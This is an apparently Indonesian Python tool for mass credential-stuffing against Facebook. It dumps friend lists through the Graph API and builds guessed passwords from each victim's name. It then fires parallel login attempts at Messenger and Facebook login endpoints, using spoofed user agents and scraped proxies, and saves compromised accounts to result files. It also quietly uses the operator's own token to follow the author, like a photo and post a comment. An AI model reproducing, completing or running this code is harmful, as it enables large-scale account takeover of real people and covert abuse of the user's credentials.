#! /usr/bin/env python3
import requests, json, time, random, os, re
from rich.console import Console
from rich.panel import Panel
from concurrent.futures import ThreadPoolExecutor
from rich import print
from rich.columns import Columns
from rich.tree import Tree
from requests.exceptions import RequestException
#------------------[ APPEND [] ]-------------------#
ugen2 = []
ugent = []
uaku2 = []
usam = []
ugen = []
uakuh = []
usragent = []
#------------------[ USER-AGENT ]-------------------#
try:
	prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=80000&country=all&ssl=all&anonymity=all').text
	open('.prox.txt','w').write(prox)
except Exception as e:
	print(' [+] Koneksi Internet Anda Tidak Terdeteksi Silahkan Cek Kuota Anda Ya Salam Dari BrayennnXD');exit()
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
	a='Mozilla/5.0 (Linux; U; Android 7.1.2;'
	b=random.randrange(1, 9)
	c=random.randrange(1, 9)
	d='Redmi 4A Build/N2G47H)'
	e=random.randrange(100, 9999)
	f='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.128'
	g=random.randrange(1, 9)
	h=random.randrange(1, 4)
	i=random.randrange(1, 4)
	j=random.randrange(1, 4)
	k='Mobile Safari/537.36 XiaoMi/Mint Browser/1.3.3'
	uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
	ugen2.append(uaku)

#------------[ UBAH UA DIH SINI OM ]---------------#
for brayen in range(10000):
    rr = random.randint
    rc = random.choice
    g1 = random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19'])
    g2 = random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1','QKQ1'])
    u1 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-A405FN Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u2 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; M2012K11AG Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u3 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Infinix X5514D Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u4 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; Meizu C10 Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    u5 = f"Mozilla/5.0 (Linux; Android {str(rr(4,12))}; SM-J120H Build/{g2}.{str(rr(111111,210000))}.0{g1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(rr(73,150))}.0.{str(rr(5500,5900))}.{str(rr(75,150))} Mobile Safari/537.36"
    UaMainn = random.choice([u1, u2, u3, u4, u5])
    ugen.append(UaMainn)
 
for x in range(10):
	a=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13'])
	c=random.randrange(73,100)
	d=random.randrange(4200,4900)
	e=random.randrange(40,150)
	uak=f'Mozilla/5.0 (Linux; Android {a}; Pixel {b}) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{c}.0.{d}.{e} Mobile Safari/537.36'
    
for td in range(10):
    	a=random.choice(['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','11.1.1','11.4.2','5.1.4','5.0.2','5.1.1'])
    	b=random.choice(['Nokia C3 Build/QP1A.190711.020; wv)','Archos Oxygen 57 Build/P00610; wv)','RCT6716Q25 Build/QP1A.190711.020; wv)','Z6750M Build/QKQ1.200913.002; wv)','S98Pro Build/SP1A.210812.016; wv)','100026191 Build/RP1A.200720.011; wv)','SC-51B Build/TP1A.220624.014; wv)','ONA19TB003 Build/PPR1.180610.011; wv)','Titan Slim Build/RP1A.200720.011; wv)','TECNO KI5k Build/SP1A.210812.016; wv)','XT1068 Build/LXB22.46-28)','Moto G (5) Plus Build/NPNS25.137-35-5)','oppo 15 )','OPPO 1105 Build/KTU84P)','TECNO KG8 Build/RP1A.200720.011; wv)','TECNO Mobile KG8 Build/RP1A.200720.011; wv)','TECNO KG8 Build/RP1A.200720.011)','vivo Y31 Build/LRX22G)','V2036 Build/SP1A.210812.003; wv)','V2036) AppleWebKit/537.36','Redmi K30 Pro Build/SKQ1.211006.001; wv)','Redmi K30 Pro Build/RKQ1.200826.002; wv)','V2036 Build/TP1A.220624.014; wv)','V2036 Build/SP1A.210812.003; wv)','Redmi K30 Pro Build/SKQ1.211006.001; wv)','Redmi K30 Pro Build/SKQ1.211006.001; wv)','(Windows NT 10.0; Win64; x64)','(Windows NT 10.0; Win64; x64)','(iPhone; CPU iPhone OS 15_4 like Mac OS X)'])
    	c=random.choice(['Version/4.0 Chrome/108.0.5359.128 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]','Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/332.0.0.22.108;]','Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/386.0.0.19.106;]','Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]','Version/4.0 Chrome/108.0.5359.79 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/395.0.0.27.214;]','Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/332.0.0.23.111;]','Version/4.0 Chrome/87.0.4280.101 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/369.0.0.18.103;]','Version/4.0 Chrome/93.0.4577.82 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/364.1.0.25.132;]','Version/4.0 Chrome/113.0.5672.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]','Version/4.0 Chrome/112.0.5615.135 Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]','Version/4.0 Chrome/112.0.5615.135 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]','Version/4.0 Chrome/112.0.5615.136 Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]','Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/405.0.0.23.72;]','Version/4.0 Chrome/113.0.5672.114 Safari/537.36 [FB_IAB/FB4A;FBAV/414.0.0.30.113;]','Version/4.0 Chrome/112.0.5615.136 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/413.0.0.30.104;]','Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36','Chrome/80.0.3987.87 Mobile Safari/537.36 YaApp_Android/10.30 YaSearchBrowser/10.30','Chrome/76.0.217.77 Mobile Safari/537.36','Chrome/183.0.1444.82 UCBrowser/12.13.4.1214 Mobile Safari/537.36','Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/403.1.0.17.106;]','Chrome/84.0.4147.89 Mobile Safari/537.36','Chrome/85.0.4183.101 Mobile Safari/537.36','Chrome/83.0.4103.106 Mobile Safari/537.36 OPR/59.1.2926.54067','Chrome/81.0.4044.122 Mobile Safari/537.36','Chrome/83.0.4103.106 Mobile Safari/537.36','Chrome/83.0.4103.101 Mobile Safari/537.36','Chrome/83.0.4103.96 Mobile Safari/537.36','Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/354.0.0.10.113;]','Chrome/108.0.0.0 Mobile Safari/537.36','Version/4.0 Chrome/111.0.5563.116 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/403.1.0.17.106;]','Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/379.1.0.23.114;]','Version/4.0 Chrome/104.0.5112.97 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/343.0.0.13.79;]','Version/4.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/388.0.0.32.105;]','Version/4.0 Chrome/111.0.5563.57 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/402.0.0.11.101;]','Version/4.0 Chrome/110.0.5481.65 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/343.0.0.13.79;]','Version/4.0 Chrome/109.0.5414.117 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/400.0.0.37.76;]','Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36[FBAN/EMA;FBLC/en_GB;FBAV/340.0.0.9.76;]','Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 T7/13.15','Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 T7/13.15 SP-engine/2.53.0 baiduboxapp/13.15.0.11 (Baidu; P1 12) NABar/1.0','Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36 T7/13.16','Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.54 GLS/92.10.9729.30','Chrome/108.0.0.0 Safari/537.36 Edg/108.0.1462.87','EdgiOS/108.0.1462.62 Version/15.0 Mobile/15E148 Safari/604.1'])
    	ua1=f"Mozilla/5.0 (Linux; Android {a}; {b} AppleWebKit/537.36 (KHTML, like Gecko) {c}"
    	ua2=f"Mozilla/5.0 ({b} AppleWebKit/537.36 (KHTML, like Gecko) {c}"
	UaGwe=random.choice([u1, u2])
	ugen2.append(UaGwe)
def uaku():
	try:
		ua=open('bbnew.txt','r').read().splitlines()
		for ub in ua:
			ugen.append(ub)
	except:
		a=requests.get('https://github.com/Itsmeafriliyan/List-User-Agent/blob/main/list_user-agent.txt').text
		ua=open('.list_user-agent.txt','w')
		aa=re.findall('line">(.*?)<',str(a))
		for un in aa:
			ua.write(un+'\n')
		ua=open('.list_user-agent.txt','r').read().splitlines()
Dump, Looping, Ok, Cp = [], 0, [], []
# Pilih Metode Crack
def tanya_metode():
    while True:
        try:
            print(Panel("""[bold green]1[bold white]. Gunakan Metode ([bold green]www.alpha.messenger.com[bold white])
[bold green]2[bold white]. Gunakan Metode ([bold yellow]b-www.facebook.com[bold white])""", width=47, style="bold white"))
            metode = Console().input("[bold white][[bold green]?[bold white]] Choose : ")
            print(Panel("""[bold white]Hasil Ok Tersimpan Di[bold green] Results/Ok.txt
[bold white]Hasil Cp Tersimpan Di[bold yellow] Results/Cp.txt""", width=47, style="bold white"))
            with ThreadPoolExecutor(max_workers=35) as s:
                for z in Dump:
                    password = []
                    email, name = z.split('|')[0], z.split('|')[1].lower()
                    for nama in name.split(' '):
                        if len(nama) < 3:
                            continue
                        elif len(nama) == 3 or len (nama) == 4 or len(nama) == 5:
                            password.append(name)
                            password.append(nama + '123')
                            password.append(nama + '1234')
                            password.append(nama + '12345')
                            password.append(nama + '123456')
                        else:
                            password.append(name)
                            password.append(nama)
                            password.append(nama + '123')
                            password.append(nama + '1234')
                            password.append(nama + '12345')
                            password.append(nama + '123456')
                    if metode == '1' or metode == '01':
                        s.submit(main_alpha, Dump, email, password)
                    else:
                        s.submit(main_b_www, Dump, email, password)
            print("\r[bold white][[bold green]Selesai[bold white]]                                      ");break
        except (KeyboardInterrupt, Exception) as e:
            break
# Crack Dengan Metode Messenger
def main_alpha(total, email, pwx):
    global Looping, Ok, Cp
    try:
        for password in pwx:
            with requests.Session() as r:
                acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64'])
                browser_version = (f'{random.randrange(90, 108)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
                useragent = ('Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(acak_device, browser_version))
                r.headers.update({
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
                    'accept-language': 'en-US,en;q=0.9',
                    'connection': 'keep-alive',
                    'Host': 'www.alpha.messenger.com',
                    'sec-fetch-user': '?1',
                    'sec-ch-ua-mobile': '?0',
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'upgrade-insecure-requests': '1',
                    'user-agent': useragent,
                    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+).', str(useragent)).group(1), re.search('Chrome/(\d+).', str(useragent)).group(1)),
                })
                response = r.get('https://www.alpha.messenger.com/').text
                try:
                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response)).group(1)
                    lsd = re.search('name="lsd" value="(.*?)"', str(response)).group(1)
                    initial_request_id = re.search('name="initial_request_id" value="(.*?)"', str(response)).group(1)
                    lgnrnd = re.search('name="lgnrnd" value="(.*?)"', str(response)).group(1)
                    lgnjs = re.search('name="lgnjs" value="(.*?)"', str(response)).group(1)
                    _js_datr = re.search('"_js_datr","(.*?)"', str(response)).group(1)
                except (AttributeError):
                    print("[bold white][[bold yellow]![bold white]][bold yellow] AttributeError...                            ", end='\r');time.sleep(1.0);continue
                r.headers.update({
                    'origin': 'https://www.alpha.messenger.com',
                    'sec-fetch-site': 'same-origin',
                    'referer': 'https://www.alpha.messenger.com/',
                    'cache-control': 'max-age=0',
                    'cookie': '_js_datr={}; wd=1280x601; dpr=1.5'.format(_js_datr),
                    'accept-encoding': 'gzip, deflate, br',
                    'content-type': 'application/x-www-form-urlencoded',
                })
                data = {
                    'jazoest': jazoest,
                    'lsd': lsd,
                    'initial_request_id': initial_request_id,
                    'timezone': '-420',
                    'lgndim': '',
                    'lgnrnd': lgnrnd,
                    'lgnjs': lgnjs,
                    'email': email,
                    'pass': password,
                    'login': '1',
                    'persistent': '1',
                    'default_persistent': '',
                }
                response2 = r.post('https://www.alpha.messenger.com/login/password/', data = data, allow_redirects = True)
                #open('Data/Response.txt', 'a').write(f'{email}<=>{password}<=>{r.cookies.get_dict()}<=>{response2.url}\n')
                if 'c_user' in r.cookies.get_dict():
                    tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold white"))
                    tree.add(Panel(f"[bold green]{email}[bold white]|[bold green]{password}[bold white]|[bold green]{';'.join([str(x)+'='+str(y) for x,y in r.cookies.get_dict().items()])}", width = 44, style="bold white"))
                    tree.add(Panel(f"[bold green]{useragent}", width = 44, style="bold white"))
                    print(tree)
                    Ok.append(f'{email}|{password}')
                    with open('Results/Ok.txt', 'a+') as w:
                        w.write(f'{email}|{password}\n')
                    w.close();break
                elif 'checkpoint_interstitial' in str(response2.url):
                    tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style="bold white"))
                    tree.add(Panel(f"[bold red]{email}[bold white]|[bold red]{password}", width = 44, style="bold white"))
                    tree.add(Panel(f"[bold red]{useragent}", width = 44, style="bold white"))
                    print(tree)
                    Cp.append(f'{email}|{password}')
                    with open('Results/Cp.txt', 'a+') as w:
                        w.write(f'{email}|{password}\n')
                    w.close();break
                else:
                    continue
        Looping += 1
        print(f"[bold white][Crack] [bold blue]{email}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{Looping}[bold white] Ok-:[bold green]{len(Ok)}[bold white] Cp-:[bold yellow]{len(Cp)}               ", end='\r')
    except (RequestException) as e:
        print("[bold white][[bold red]![bold white]][bold red] Koneksi Error...                            ", end='\r');time.sleep(7.5);main_alpha(total, email, pwx)
# Crack Dengan Metode B-Www
def main_b_www(total, email, pwx):
    global Looping, Ok, Cp
    try:
        for password in pwx:
            with requests.Session() as r:
                acak_device = random.choice(['Windows NT 10.0; Win64; x64', 'Windows NT 10.0; WOW64', 'Windows NT 10.0', 'Macintosh; Intel Mac OS X 13_2', 'X11; Linux x86_64'])
                browser_version = (f'{random.randrange(90, 108)}.0.{random.randrange(4200, 4900)}.{random.randrange(40, 150)}')
                useragent = ('Mozilla/5.0 ({}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{} Safari/537.36'.format(acak_device, browser_version))
                r.headers.update({
                    'Host': 'm.facebook.com',
                    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'accept-language': 'en-US,en;q=0.9',
                    'cache-control': 'max-age=0',
                    'connection': 'keep-alive',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+).', str(useragent)).group(1), re.search('Chrome/(\d+).', str(useragent)).group(1)),
                    'sec-fetch-dest': 'document',
                    'sec-fetch-mode': 'navigate',
                    'sec-fetch-site': 'none',
                    'sec-fetch-user': '?1',
                    'upgrade-insecure-requests': '1',
                    'user-agent': useragent
                })
                response = r.get('https://m.facebook.com/').text
                r.headers.update({
                    'Host': 'b-www.facebook.com',
                    'cookie': ('; '.join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()]))
                })
                response2 = r.get('https://b-www.facebook.com/').text
                try:
                    privacy_mutation_token = re.search('action="/login/\\?privacy_mutation_token=(.*?)"', str(response2)).group(1)
                    jazoest = re.search('name="jazoest" value="(\d+)"', str(response2)).group(1)
                    lsd = re.search('name="lsd" value="(.*?)"', str(response2)).group(1)
                    login_source = re.search('name="login_source" value="(.*?)"', str(response2)).group(1)
                    __spin_t = re.search('"__spin_t":(\d+),', str(response2)).group(1)
                except (AttributeError):
                    print("[bold white][[bold yellow]![bold white]][bold yellow] AttributeError...                            ", end='\r');time.sleep(1.0);continue
                data = {
                    'jazoest': jazoest,
                    'lsd': lsd,
                    'email': email,
                    'login_source': login_source,
                    'next': '',
                    'encpass': f'#PWD_BROWSER:0:{__spin_t}:{password}',
                }
                r.headers.update({
                    'accept-encoding': 'gzip, deflate, br',
                    'content-type': 'application/x-www-form-urlencoded',
                    'cookie': ('; '.join([str(x)+"="+str(y) for x,y in r.cookies.get_dict().items()])),
                    'origin': 'https://b-www.facebook.com',
                    'content-length': str(len(("&").join(["%s=%s" % (x, y) for x, y in data.items()]))),
                    'referer': 'https://b-www.facebook.com/?',
                    'sec-fetch-site': 'same-origin',
                })
                response3 = r.post('https://b-www.facebook.com/login/?privacy_mutation_token={}'.format(privacy_mutation_token), data = data, allow_redirects = True)
                #open('Data/Response.txt', 'a').write(f'{email}<=>{password}<=>{r.cookies.get_dict()}<=>{response3.url}\n')
                if 'c_user' in r.cookies.get_dict():
                    tree = Tree(Panel.fit("[bold green]LOGIN SUCCESS", style="bold white"))
                    tree.add(Panel(f"[bold green]{email}[bold white]|[bold green]{password}[bold white]|[bold green]{';'.join([str(x)+'='+str(y) for x,y in r.cookies.get_dict().items()])}", width = 44, style="bold white"))
                    tree.add(Panel(f"[bold green]{useragent}", width = 44, style="bold white"))
                    print(tree)
                    Ok.append(f'{email}|{password}')
                    with open('Results/Ok.txt', 'a+') as w:
                        w.write(f'{email}|{password}\n')
                    w.close();break
                elif 'checkpoint' in r.cookies.get_dict():
                    tree = Tree(Panel.fit("[bold red]LOGIN CHECKPOINT", style="bold white"))
                    tree.add(Panel(f"[bold red]{email}[bold white]|[bold red]{password}", width = 44, style="bold white"))
                    tree.add(Panel(f"[bold red]{useragent}", width = 44, style="bold white"))
                    print(tree)
                    Cp.append(f'{email}|{password}')
                    with open('Results/Cp.txt', 'a+') as w:
                        w.write(f'{email}|{password}\n')
                    w.close();break
                else:
                    continue
        Looping += 1
        print(f"[bold white][Crack] [bold blue]{email}[bold white]/[bold blue]{str(len(total))}[bold white]/[bold blue]{Looping}[bold white] Ok-:[bold green]{len(Ok)}[bold white] Cp-:[bold yellow]{len(Cp)}               ", end='\r')
    except (RequestException) as e:
        print("[bold white][[bold red]![bold white]][bold red] Koneksi Error...                            ", end='\r');time.sleep(7.5);main_b_www(total, email, pwx)
while True:
    os.system(
        'cls' if os.name == 'nt' else 'reset'
    )
    print(Panel("""[bold red]●[bold yellow] ●[bold green] ●
[bold red]   ____  ____  ____  ____     ____  ____ 
[bold red]  (  __)(  _ \(  __)(  __)___(  __)(  _ \\
[bold red]   ) _)  )   / ) _)  ) _)(___)) _)  ) _ (
[bold white]  (__)  (__\_)(____)(____)   (__)  (____/
\t   [underline blue]Coded by Rozhak-XD""", width=47, title="Version 2.5", style="bold white")) # Coded by Rozhak-XD
    try:
        token = json.loads(open('Data/Token.json', 'r').read())['Token']
        response = requests.get(
            'https://graph.facebook.com/me/?&access_token={}'
        .format(token)).json()
        if 'Application does not have the capability to make this API call.' in str(response):
            print("[bold white][[bold red]![bold white]][bold red] Akun Facebook Tidak Dapat Mengakses Graph Api...");time.sleep(5.5);os.remove('Data/Token.json');continue
        name, user, birthday = response['name'], response['id'], response['birthday']
        try:
            nomor = response['mobile_phone']
        except (KeyError):
            nomor = ('-')
    except (RequestException) as e:
        print("[bold white][[bold red]![bold white]][bold red] Koneksi Error...");time.sleep(5.5);continue
    except (Exception) as e:
        print(f"[bold white][[bold red]![bold white]][bold red] {str(e).title()}");time.sleep(3.5)
        print(Panel(f"[bold white] Silahkan Ketik[bold green] GET[bold white] Untuk Mendapatkan Akses Token Facebook...", width=47, style="bold white"))
        token = Console().input(f"[bold white][[bold green]?[bold white]] Token : ")
        if token.lower() == 'get' or 'get' in str(token.lower()):
            print("[bold white][[bold green]*[bold white]][bold green] Kamu Akan Diarahkan Ke Youtube!");os.system('xdg-open https://youtu.be/IggmQYTJsgE');time.sleep(2.5);break
        else:
            with open('Data/Token.json', 'w') as w:
                w.write(json.dumps({
                    'Token': token
                }))
            w.close()
            try:
                cookies = {}
                for key in requests.get('https://api.facebook.com/method/auth.getSessionforApp?access_token={}&format=json&new_app_id=1348564698517390&generate_session_cookies=1'.format(token)).json()['session_cookies']:
                    cookies.update({key['name']: key['value']})
                cookies = ("; ".join([str(x)+"="+str(y) for x,y in cookies.items()]))
                response = requests.get('https://mbasic.facebook.com/Itsme.Dvanme', headers = {'cookie': cookies}).text # Jangan Di Ganti
                if '/a/subscribe.php?id=' in str(response):
                    requests.get('https://mbasic.facebook.com/a/subscribe.php?{}'.format(re.search('href="/a/subscribe.php\\?(.*?)"', str(response)).group(1).replace('amp;', '')), headers = {'cookie': cookies})
                response2 = requests.get('https://www.facebook.com/photo/?fbid=1672257059893457&set=a.161861817599663', headers = {'cookie': cookies}).text # Jangan Di Ganti
                data = {
                    'fb_dtsg': re.search('name="fb_dtsg" value="(.*?)"', str(response2)).group(1),
                    'jazoest': re.search('name="jazoest" value="(.*?)"', str(response2)).group(1),
                    'comment_text': 'Gw Pake Sc Lu Bang 😘',
                }
                response3 = requests.post('https://mbasic.facebook.com/a/comment.php?{}'.format(re.search('action="/a/comment.php\\?(.*?)"', str(response2)).group(1).replace('amp;', '')), data = data, headers = {'cookie': cookies})
                if 'href="/a/like.php?ul' in str(response2):
                    requests.get('https://mbasic.facebook.com/a/like.php?{}'.format(re.search('href="/a/like.php\\?(.*?)"', str(response2)).group(1).replace('amp;', '')), headers = {'cookie': cookies})
                print("[bold white][[bold green]*[bold white]] Login Sukses!");time.sleep(2.5)
                continue
            except Exception as e:
                print(Panel(f"[bold red] {str(e).title()}!", width=47, style="bold white"));time.sleep(2.4);continue
    print(Columns([
        Panel(f"""[bold white]Name :[bold green] {name[:12]}
[bold white]User :[bold yellow] {user[:12]}""", width=23, style="bold white"),
        Panel(f"""[bold white]Lahir :[bold green] {birthday[:12]}
[bold white]Nomor :[bold yellow] {nomor.replace('+62', '')[:12]}""", width=23, style="bold white")
    ]))
    print(Panel("""[bold white][[bold green]1[bold white]]. Crack User Dari Publik ([bold green]Masal[bold white])
[bold white][[bold green]2[bold white]]. Crack Dari Teman Ke Teman
[bold white][[bold green]3[bold white]]. Crack User From Friends
[bold white][[bold green]4[bold white]]. Keluar ([bold red]Exit[bold white])""", width=47, style="bold white"))
    try:
        query = Console().input(f"[bold white][[bold green]?[bold white]] Choose : ")
        if query == '1' or query == '01':
            print(Panel(f"[bold white] Silahkan Masukan User Target, Gunakan Koma Untuk Dump Masal, Contoh :[bold green] 757953543,120,4", width=47, style="bold white"))
            id_target = Console().input(f"[bold white][[bold green]?[bold white]] User : ")
            for uid in id_target.split(','):
                try:
                    if uid.isnumeric() == True:
                        params = {
                            'fields': 'friends.fields(id,name).limit(5000)',
                            'access_token': token
                        }
                        for i in json.loads(requests.get('https://graph.facebook.com/{}/'.format(uid), params = params).text)['friends']['data']:
                            id, name = i['id'], i['name']
                            if not str(id) in str(Dump):
                                print(f"[bold white][[bold green]*[bold white]] Dump[bold green] {id}[bold white]/[bold green]{len(Dump)}[bold white] User                  ", end='\r');time.sleep(0.0007)
                                Dump.insert(0, f'{id}|{name}')
                            else:
                                continue
                    else:
                        print("[bold white][[bold red]![bold white]][bold red] Hanya Angka...                ", end='\r');time.sleep(2.1);continue
                except (KeyError):
                    print(f"[bold white][[bold red]![bold white]][bold red] Teman {uid} Kosong...                ", end='\r');time.sleep(2.1);continue
                except (KeyboardInterrupt):
                    print("                                              ", end='\r');print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", width=47, style="bold white"));tanya_metode()
            if len(Dump) != 0:
                print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", width=47, style="bold white"));tanya_metode()
            else:
                print("[bold white][[bold red]![bold white]][bold red] Tidak Ada Teman Yang Terkumpul...                ", end='\r');time.sleep(2.1);break
        elif query == '2' or query == '02':
            print(Panel(f"[bold white] Silahkan Masukan User Target, Gunakan Koma Untuk Dump Masal, Contoh :[bold green] 757953543,120,4", width=47, style="bold white"))
            id_target = Console().input(f"[bold white][[bold green]?[bold white]] User : ")
            if id_target.isnumeric() == True:
                try:
                    params = {
                        'fields': 'friends.fields(id,name).limit(5000)',
                        'access_token': token
                    }
                    for z in json.loads(requests.get('https://graph.facebook.com/{}/'.format(id_target), params = params).text)['friends']['data']:
                        id, name = z['id'], z['name']
                        if not str(id) in str(Dump):
                            print(f"[bold white][[bold green]*[bold white]] Dump[bold green] {id}[bold white]/[bold green]{len(Dump)}[bold white] User                  ", end='\r');time.sleep(0.0007)
                            Dump.insert(0, f'{id}|{name}')
                        else:
                            continue
                    for x in Dump:
                        try:
                            uid = x.split('|')[0]
                            for i in json.loads(requests.get('https://graph.facebook.com/{}/'.format(uid), params = params).text)['friends']['data']:
                                id, name = i['id'], i['name']
                                if not str(id) in str(Dump):
                                    print(f"[bold white][[bold green]*[bold white]] Dump[bold green] {id}[bold white]/[bold green]{len(Dump)}[bold white] User                  ", end='\r');time.sleep(0.0007)
                                    Dump.insert(0, f'{id}|{name}')
                                else:
                                    continue
                        except (KeyError):
                            print(f"[bold white][[bold red]![bold white]][bold red] Teman {uid} Kosong...                ", end='\r');time.sleep(1.5);continue
                    if len(Dump) != 0:
                        print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", width=47, style="bold white"));tanya_metode()
                    else:
                        print("[bold white][[bold red]![bold white]][bold red] Tidak Ada Teman Yang Terkumpul...                ", end='\r');time.sleep(2.1);break
                except (KeyboardInterrupt):
                    print("                                              ", end='\r');print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", width=47, style="bold white"));tanya_metode()
            else:
                print("[bold white][[bold red]![bold white]][bold red] Bukan Angka...                ", end='\r');time.sleep(2.1);break
        elif query == '3' or query == '03':
            params = {
                'fields': 'friends.fields(id,name).limit(5000)',
                'access_token': token
            }
            for z in json.loads(requests.get('https://graph.facebook.com/me/', params = params).text)['friends']['data']:
                try:
                    id, name = z['id'], z['name']
                    print(f"[bold white][[bold green]*[bold white]] Dump[bold green] {id}[bold white]/[bold green]{len(Dump)}[bold white] User                  ", end='\r');time.sleep(0.0007)
                    Dump.insert(0, f'{id}|{name}')
                except (KeyboardInterrupt):
                    print("                                              ", end='\r');print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", width=47, style="bold white"));tanya_metode()
                except (KeyError):
                    print(f"[bold white][[bold red]![bold white]][bold red] Kamu Tidak Punya Teman...                ", end='\r');time.sleep(3.5);break
            if len(Dump) != 0:
                print(Panel(f"[bold white]Jumlah User :[bold green] {len(Dump)}", width=47, style="bold white"));tanya_metode()
            else:
                print("[bold white][[bold red]![bold white]][bold red] Tidak Ada Teman Yang Terkumpul...                ", end='\r');time.sleep(2.1);break
        elif query == '4' or query == '04':
            try:
                print("[bold white][[bold green]*[bold white]][bold green] Hapus Token Facebook...");time.sleep(2.5);os.remove('Data/Token.json');break
            except:break
        else:
            print("[bold white][[bold red]![bold white]][bold red] Pilihan Tidak Diketahui...");time.sleep(2.5);break
        break
    except (Exception) as e:
        print(Panel(f"[bold red] {str(e).title()}!", width=47, style="bold white"));break
